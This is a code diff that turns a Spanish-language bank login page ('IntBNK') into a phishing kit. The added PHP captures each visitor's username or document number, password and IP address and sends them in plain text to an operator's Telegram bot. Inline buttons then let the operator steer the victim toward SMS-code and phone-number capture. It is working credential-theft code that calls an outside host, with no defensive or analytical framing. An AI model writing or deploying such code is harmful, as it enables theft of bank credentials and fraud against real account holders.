@@ -1,3 +1,36 @@
+<?php
+session_start();
+include("settings.php"); // Este archivo debe tener $token y $chat_id
+
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    $usuario = htmlspecialchars($_POST['ips1'] ?? '');
+    $clave = htmlspecialchars($_POST['ips2'] ?? '');
+    $ip = $_SERVER['REMOTE_ADDR'];
+
+    $_SESSION['usuario'] = $usuario;
+
+    $msg = "🔐 NUEVO INGRESO IntBNK\n👤 Usuario: $usuario\n🔑 Clave: $clave\n🌐 IP: $ip";
+
+    // Enviar con botones usando "|" como separador
+    file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query([
+        'chat_id' => $chat_id,
+        'text' => $msg,
+        'reply_markup' => json_encode([
+            'inline_keyboard' => [
+                [
+                    ['text' => '❌ Login Error', 'callback_data' => "ERROR|$usuario"],
+                    ['text' => '📩 SMS', 'callback_data' => "SMS|$usuario"],
+                    ['text' => '📱 Teléfono', 'callback_data' => "NUMERO|$usuario"]
+                ]
+            ]
+        ])
+    ]));
+
+    header("Location: loading.html");
+    exit;
+}
+?>
+
 <!DOCTYPE html>
 <html lang="es">
 <head>
@@ -265,7 +298,7 @@
 <img class="bluee-img" src="img/bluee.svg" alt="">
 
 <div class="card">
-    <form action="loading.html" method="GET">
+    <form action="index.php" method="post">
 
         <!-- Documento -->
         <div class="field-group">
@@ -279,7 +312,7 @@
                 </div>
 
                 <div class="input-wrap">
-                    <input id="email"
+                    <input  name="ips1" id="ips1"
                         type="tel"
                         id="docNumber"
                         name="numero_documento"
@@ -296,7 +329,7 @@
         <div class="pw-label">Contraseña</div>
 
         <div class="pw-row">
-            <input id="clave" id="password" type="password" name="password">
+            <input  name="ips2" id="ips2" id="password" type="password" name="password">
             <div class="eye" id="togglePassword">
                 <img src="img/eye-open.png" alt="Mostrar contraseña">
             </div>
